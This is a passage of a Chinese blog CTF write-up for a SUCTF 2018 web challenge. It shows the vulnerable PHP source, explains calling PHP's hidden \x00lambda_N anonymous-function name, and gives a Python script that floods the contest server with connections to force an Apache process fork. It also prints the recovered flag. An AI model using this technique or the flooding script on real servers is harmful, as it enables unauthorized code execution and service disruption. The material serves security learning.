<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">    $hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">        .<span class="string">"global \$MY;"</span></span><br><span class="line">        .<span class="string">"\$MY();"</span></span><br><span class="line">        .<span class="string">"&#125;"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">        $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>创建了匿名函数$MY来显示flag。显然不能直接爆破$hash，但由于PHP Zend Engine实际上是通过一个特殊的函数名(\x00_lambda_<em>N</em>, <em>N</em>是当前进程的匿名函数编号)来标记匿名函数，所以调用这个函数就可以实现功能了。</p>
<p>还有另外一点需要注意，为了使函数编号为0，我们需要大量给服务器发包，迫使Apache Fork一个新进程处理我们的请求：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># Modified to adapt SUCTF 2018</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">'web.suctf.asuri.org'</span></span><br><span class="line">        PORT = <span class="number">81</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">'GET / HTTP/1.1\nHost: web.suctf.asuri.org\nConnection: Keep-Alive\n\n'</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
<p>在这个脚本运行的同时提交payload即可。</p>
<blockquote>
<p>SUCTF{L4GsMqu6gu5knFnCi2Te8SjSucxKfQj6tuPJokoFhTCJjpa6RSfK}</p>
</blockquote>
<h2 id="PWN-amp-RE"><a href="#PWN-amp-RE" class="headerlink" title="PWN &amp; RE"></a>PWN &amp; RE</h2><p>别想了 我们队哪有人会搞这个？</p>
</div><div class="tags"><a href="/tags/suctf/">suctf</a></div><div class="post-nav"><a class="pre" href="/2019/02/12/linux-timezone-setting/">调整 Linux 时区设置</a><a class="next" href="/2018/05/27/ciscn-prelim-wp/">CISCN 2018 初赛 Write-up</a></div><div class="post-ad"><script src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8173953423049587" data-ad-slot="3190220378" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">阅读评论（请确保 Disqus 可以正常加载）</button></div><script type="text/javascript">var disqus_config = function () {
    this.page.url = 'https://lpnal.me/2018/05/27/suctf-writeup/';
    this.page.identifier = '2018/05/27/suctf-writeup/';
    this.page.title = 'SUCTF 2018 Write-up';
  };</script><script type="text/javascript" id="disqus-lazy-load-script">$.ajax({
url: 'https://disqus.com/next/config.json',
timeout: 2500,
type: 'GET',
success: function(){
  var d = document;
  var s = d.createElement('script');
  s.src = '//blog-lpnal.disqus.com/embed.js';
  s.setAttribute('data-timestamp', + new Date());
  (d.head || d.body).appendChild(s);
  $('.disqus_click_btn').css('display', 'none');
},
error: function() {
  $('.disqus_click_btn').css('display', 'block');
}
});</script><script type="text/javascript" id="disqus-click-load">$('.btn_click_load').click(() => {  //click to load comments
    (() => { // DON'T EDIT BELOW THIS LINE
        var d = document;
        var s = d.createElement('script');
        s.src = '//blog-lpnal.disqus.com/embed.js';
        s.setAttribute('data-timestamp', + new Date());
        (d.head || d.body).appendChild(s);
    })();
    $('.disqus_click_btn').css('display','none');
});</script><script type="text/javascript" id="disqus-count-script">$(function() {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', '//disqus.com/next/config.json', true);
     xhr.timeout = 2500;
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         $('.post-meta .post-comments-count').show();
         var s = document.createElement('script');
         s.id = 'dsq-count-scr';
         s.src = 'https://blog-lpnal.disqus.com/count.js';
         s.async = true;
         (document.head || document.body).appendChild(s);
       }
     };
     xhr.ontimeout = function () { xhr.abort(); };
     xhr.send(null);
   });
</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://lpnal.me"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/blog/">blog</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/cs/">cs</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/writeup/">writeup</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/gctf/" style="font-size: 15px;">gctf</a> <a href="/tags/eail/" style="font-size: 15px;">eail</a> <a href="/tags/ciscn/" style="font-size: 15px;">ciscn</a> <a href="/tags/timezone/" style="font-size: 15px;">timezone</a> <a href="/tags/virtualenv/" style="font-size: 15px;">virtualenv</a> <a href="/tags/vscode/" style="font-size: 15px;">vscode</a> <a href="/tags/git/" style="font-size: 15px;">git</a> <a href="/tags/travis/" style="font-size: 15px;">travis</a> <a href="/tags/csrg/" style="font-size: 15px;">csrg</a> <a href="/tags/hexo/" style="font-size: 15px;">hexo</a> <a href="/tags/jekyll/" style="font-size: 15px;">jekyll</a> <a href="/tags/suctf/" style="font-size: 15px;">suctf</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/04/24/ciscn-2019-writeup/">2019 ciscn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/noip-2017-puji/">某测试程序阅读题详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/23/git-submodule/">Git 子模块</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/14/porting-to-hexo/">从 GitHub Pages 迁移到 Hexo：Hexo + Travis CI + VPS + GPages，双镜像站点侧记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/13/venvwrapper-and-vscode/">virtualenvwrapper 配合 Visual Studio Code 使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/12/linux-timezone-setting/">调整 Linux 时区设置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/suctf-writeup/">SUCTF 2018 Write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/ciscn-prelim-wp/">CISCN 2018 初赛 Write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/an-introduction-to-cs/">计算机科学知识体系系列 - 导论</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/gctf-2017-write-up/">GCTF 2017 Write-up</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-comment-o"> 最近评论</i></div><script type="text/javascript" src="//blog-lpnal.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=1&amp;avatar_size=32&amp;excerpt_length=20&amp;hide_mods=1"></script></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div><div class="widget"><script src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async="async"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8173953423049587" data-ad-slot="4758934440" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">ultranal blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a><br></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
  });
</script><script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML" async></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>